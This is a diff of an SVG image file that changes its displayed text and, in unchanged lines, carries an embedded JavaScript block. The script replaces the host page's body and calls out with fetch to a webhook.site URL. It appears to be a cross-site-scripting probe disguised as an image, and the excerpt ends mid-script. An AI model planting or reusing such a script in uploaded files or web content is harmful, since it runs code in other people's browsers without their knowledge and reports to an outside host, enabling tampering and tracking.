@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <svg xmlns="http://www.w3.org/2000/svg" width="3000" height="80">
-  <text x="10" y="50" font-size="16">hipotermia</text>
+  <text x="10" y="50" font-size="16">test</text>
   <script type="text/javascript"><![CDATA[
     document.body.innerHTML = '<p>hello</p>';
     fetch("https://webhook.site/9200dd11-610c-4c8a-aaae-41304f4145e8");
